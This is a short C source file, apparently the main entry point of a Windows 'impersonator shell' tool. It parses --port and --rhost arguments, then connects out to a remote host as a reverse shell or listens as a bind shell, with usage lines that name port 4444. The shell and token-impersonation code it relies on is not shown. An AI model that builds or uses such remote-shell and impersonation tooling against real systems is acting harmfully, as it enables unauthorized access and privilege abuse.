/*
* Author: Aleksa Zatezalo
* Date: September 2024
* Description: The impersonator shell that combines winserver.c, doexec.c, createproc.c and token_info.c into a shell. 
*/

#include "doexec.h"
#include "winserver.h"

// Compile with: gcc .\doexec.c .\main.c .\token_info.c .\winserver.c -o impersonate -lws2_32

int main(int argc, char *argv[]) {
    if(argc < 3){
        printf("USAGE: .\\impersonator --port 4444 \n");
        printf("USAGE: .\\impersonator --rhost 192.168.12.12 --port 4444 \n");
        exit(1);
    }
    char *name = argv[0];
    int port;
    char *rhost = '\0';
    for (int i = 0; i < argc; i++){
        if (!strcmp(argv[i], "--port")){
            port = atoi(argv[i + 1]);
        }
        if (!strcmp(argv[i], "--rhost")){
            rhost = argv[i + 1];
        }
    }

    if (rhost){
        client(rhost, port);
    } else {
        server(port);
    }
    
    return 0;
}